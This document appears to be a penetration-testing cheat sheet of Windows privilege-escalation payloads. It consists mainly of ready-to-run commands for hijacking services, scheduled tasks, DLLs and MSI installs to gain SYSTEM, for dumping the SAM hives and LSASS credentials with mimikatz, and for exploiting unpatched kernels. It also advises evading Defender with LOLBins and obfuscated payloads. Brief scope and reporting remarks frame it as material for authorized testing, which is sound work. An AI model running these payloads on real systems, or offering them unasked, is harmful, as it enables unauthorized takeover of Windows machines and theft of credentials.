# WINDOWS PRIVILEGE ESCALATION PAYLOADS

## Enumeration Reference

### System Info

| Command | Purpose |
|---|---|
| `systeminfo` | OS version, build, patches installed — cross-reference for missing-patch kernel exploits |
| `wmic qfe list` | Installed hotfixes/patches |
| `hostname` | Current hostname |
| `echo %PROCESSOR_ARCHITECTURE%` | CPU architecture (relevant for exploit binary choice) |
| `wmic os get osarchitecture` | Confirms 32 vs 64-bit OS |

### Users / Groups / Privileges

| Command | Purpose |
|---|---|
| `whoami` | Current user |
| `whoami /priv` | Current token privileges — look for `SeImpersonatePrivilege`, `SeBackupPrivilege`, `SeDebugPrivilege` |
| `whoami /groups` | Group memberships and integrity level |
| `net user` | List all local users |
| `net localgroup administrators` | Members of the local admin group |
| `net user <username>` | Detailed info on a specific user account |

### Services

| Command | Purpose |
|---|---|
| `wmic service list brief` | List all services |
| `sc query` | List services and their state |
| `sc qc <servicename>` | Get service config, including binary path |
| `icacls "C:\Path\To\Service.exe"` | Check write permissions on a service binary |
| `accesschk.exe -uwcqv <user> *` (Sysinternals) | Check which services a user can modify |

### Scheduled Tasks

| Command | Purpose |
|---|---|
| `schtasks /query /fo LIST /v` | List scheduled tasks with full detail |
| `icacls "C:\Path\To\TaskScript.bat"` | Check if a task's target script is writable |

### File System / Registry

| Command | Purpose |
|---|---|
| `icacls "C:\Program Files\App"` | Check folder/file permissions for write access |
| `reg query HKLM\...\Run` | Autorun registry entries |
| `reg query HKCU\...\Run` | Per-user autorun registry entries |
| `findstr /si password *.txt *.ini *.config *.xml` | Grep for plaintext credentials in common file types |
| `dir /s /b *password* == *.config*` | Locate files by name pattern that may hold secrets |
| `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` | Check for stored autologon credentials |

### Network / Processes

| Command | Purpose |
|---|---|
| `netstat -ano` | Listening ports and owning process IDs |
| `tasklist /v` | Running processes with owning user |
| `tasklist /svc` | Map processes to services |
| `netsh advfirewall show allprofiles` | Firewall configuration |

### Installed Software / AV

| Command | Purpose |
|---|---|
| `wmic product get name,version` | Installed software inventory |
| `Get-MpComputerStatus` (PowerShell) | Defender status — confirms if real-time protection is active |
| `reg query "HKLM\SOFTWARE\Microsoft\Windows Defender"` | Defender config details |

## Privilege Escalation Vectors

### Token Privilege Abuse

| Payload / Technique | Purpose |
|---|---|
| `whoami /priv` then check for `SeImpersonatePrivilege` | If present, usually exploitable via a Potato-family attack for SYSTEM |
| PrintSpoofer / RoguePotato / JuicyPotato / GodPotato | Tools that abuse `SeImpersonatePrivilege` to coerce a SYSTEM token and spawn a SYSTEM shell |
| `SeBackupPrivilege` abuse | Allows reading protected files (e.g. SAM/SYSTEM hives) bypassing normal ACLs, even without admin |
| `SeDebugPrivilege` abuse | Allows attaching to/dumping SYSTEM processes (e.g. `lsass.exe`) for credential extraction |
| `SeTakeOwnershipPrivilege` abuse | Allows taking ownership of arbitrary files/services to then modify them |

### Service Misconfiguration

| Payload / Technique | Purpose |
|---|---|
| `sc config <svc> binpath= "C:\evil.exe"` | If you have write/config permission on a service, repoint its binary to a payload, then restart it for SYSTEM execution |
| `icacls` shows write access to the service's existing binary | Replace the binary directly with a payload (msfvenom-generated or similar), restart service |
| Unquoted service path: `C:\Program Files\My App\service.exe` | If unquoted and a parent directory is writable, place a malicious `Program.exe` or `My.exe` to be executed instead |
| `wmic service get name,pathname,startmode \| findstr /i /v "C:\Windows\\"` | Quickly spot unquoted paths outside the default Windows directory |

### Scheduled Task Hijack

| Payload / Technique | Purpose |
|---|---|
| Overwrite a writable script referenced by a SYSTEM-run scheduled task | Next task execution runs your payload with SYSTEM privileges |
| `schtasks /query /fo LIST /v` to find tasks running as SYSTEM with a writable target | Identify the hijack candidate before attempting |

### AlwaysInstallElevated

| Payload / Technique | Purpose |
|---|---|
| Check both `HKLM` and `HKCU` `...\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated` keys are `1` | If both set, any user can install an MSI with SYSTEM privileges |
| `msiexec /quiet /qn /i payload.msi` | Installs a malicious MSI that runs as SYSTEM when the policy is misconfigured |

### DLL Hijacking

| Payload / Technique | Purpose |
|---|---|
| Identify a SYSTEM-run binary missing a DLL it tries to load (Process Monitor) | Place a malicious DLL with the matching name in a writable directory earlier in the search order |
| `icacls` on directories in the binary's DLL search path | Confirms write access needed to plant the malicious DLL |

### Credential Harvesting

| Payload / Technique | Purpose |
|---|---|
| `reg save hklm\sam sam.hive` + `reg save hklm\system system.hive` | Dump SAM/SYSTEM hives (requires `SeBackupPrivilege` or admin) for offline hash extraction |
| `mimikatz "sekurlsa::logonpasswords"` | Dump plaintext credentials/hashes from LSASS memory (requires admin/SYSTEM or `SeDebugPrivilege`) |
| `findstr /si password *.txt *.config *.xml` | Grep filesystem for plaintext secrets left in configs/scripts |
| Check `C:\Windows\Panther\Unattend.xml` / `sysprep.inf` | Common location for leftover plaintext deployment credentials |
| WiFi profile dump: `netsh wlan show profile name="SSID" key=clear` | Recovers saved WiFi passwords, sometimes reused elsewhere |

### Kernel Exploits

| Technique | Purpose |
|---|---|
| Match `systeminfo`/`wmic qfe list` against missing KBs | Identify unpatched local privilege escalation vulnerabilities (e.g. PrintNightmare, HiveNightmare) |
| `Watson` / `Sherlock` (PowerShell enumeration tools) | Automatically cross-reference patch level against known exploitable CVEs |
| Compile/run matched PoC for architecture | Direct kernel-level escalation — verify architecture (`wmic os get osarchitecture`) first |

## What To Look For & Next Steps

### Enumeration output

| You ran | Look for | Do next |
|---|---|---|
| `systeminfo` / `wmic qfe list` | Missing patches, old build number | Cross-reference against Watson/Sherlock or manually check for matching CVEs (PrintNightmare, HiveNightmare, etc.) |
| `whoami /priv` | `SeImpersonatePrivilege`, `SeBackupPrivilege`, `SeDebugPrivilege`, `SeTakeOwnershipPrivilege` enabled | These almost always mean a fast path to SYSTEM — go straight to the matching technique above before anything else |
| `sc qc <service>` + `icacls` on the binary | Write access to the service binary or unquoted path with writable parent dir | Replace binary or plant payload in the unquoted gap, then restart the service |
| `schtasks /query /fo LIST /v` | SYSTEM-run task pointing to a writable script | Overwrite the script, wait for next scheduled run |
| Registry `AlwaysInstallElevated` check | Both `HKLM` and `HKCU` keys set to `1` | Build and run a malicious MSI for instant SYSTEM install |
| `findstr` credential grep / `Unattend.xml` check | Plaintext passwords, deployment credentials | Reuse directly against local accounts, domain accounts, or other discovered services |
| `netstat -ano` + `tasklist /v` | SYSTEM-owned process listening only on localhost | Potential local-only service worth port-forwarding/investigating further for additional vectors |
| `reg query ...Run` (autoruns) | Entries pointing to writable file paths | Overwrite the autorun target for persistence or escalation on next logon/reboot |

### After a successful escalation technique

| Technique used | What to verify | Then |
|---|---|---|
| Potato-family exploit (SeImpersonate) | Confirm `whoami` shows `nt authority\system` | Stabilize the shell, then proceed to credential harvesting/persistence per ROE |
| Service binary/path hijack | Confirm the service restarted and payload executed as SYSTEM | Document the exact ACL misconfig (this is the real root cause for the report) |
| AlwaysInstallElevated MSI | Confirm install ran with SYSTEM context | Note both registry keys in the report — fix requires disabling the policy, not just removing your MSI |
| DLL hijack | Confirm payload DLL was loaded by the SYSTEM process (Process Monitor/log) | Document full DLL search order and which directory was writable |
| Mimikatz/LSASS dump | Confirm valid plaintext creds or NTLM hashes recovered | Test for credential reuse/pass-the-hash across other hosts before considering it "done" |
| Kernel exploit (e.g. PrintNightmare) | Confirm `whoami` is SYSTEM **and** check for system stability | Note instability risk in the report; avoid repeat runs on shared/production boxes without sign-off |

### General signal-reading tips
- **Special privileges in `whoami /priv`** are the single highest-value enumeration result on Windows — check this before anything else.
- Defender/AV being active changes tooling choice — prefer LOLBins (`certutil`, `regsvr32`, PowerShell) and obfuscated/in-memory payloads over known-signature tools like raw Mimikatz binaries.
- Anything **writable that runs with higher privilege than you** (service binary, scheduled task script, unquoted path, DLL search location) is the pattern to hunt across every category here.

## EXAMPLE PAYLOADS

```
whoami /priv
```
```
sc config vulnsvc binpath= "C:\Users\Public\payload.exe"
sc stop vulnsvc & sc start vulnsvc
```
```
schtasks /query /fo LIST /v | findstr /i "SYSTEM"
```
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```
```
msiexec /quiet /qn /i C:\Users\Public\payload.msi
```
```
reg save hklm\sam C:\Users\Public\sam.hive
reg save hklm\system C:\Users\Public\system.hive
```
```
findstr /si password *.txt *.ini *.config *.xml
```
```
PrintSpoofer.exe -i -c cmd
```

## Tooling Note
Manual enumeration builds understanding of the box, but automate the sweep with `winPEAS`, `Seatbelt`, or `PowerUp.ps1` to catch what manual checks miss. Cross-reference unusual services/binaries against [LOLBAS](https://lolbas-project.github.io) (the Windows equivalent of GTFOBins) before assuming exploitability. Stay within authorized scope — credential dumping, service modification, and kernel exploits can disrupt production systems or trigger EDR/AV alerting.

## Quick Notes
- `whoami /priv` and service/task ACL checks are almost always the fastest wins — check those before reaching for a kernel exploit.
- Kernel exploits carry real stability risk on Windows too — prefer config/permission-based escalation when both are available.
- Document exact build numbers, KBs, and tool versions used; many of these techniques are version- and patch-level specific.
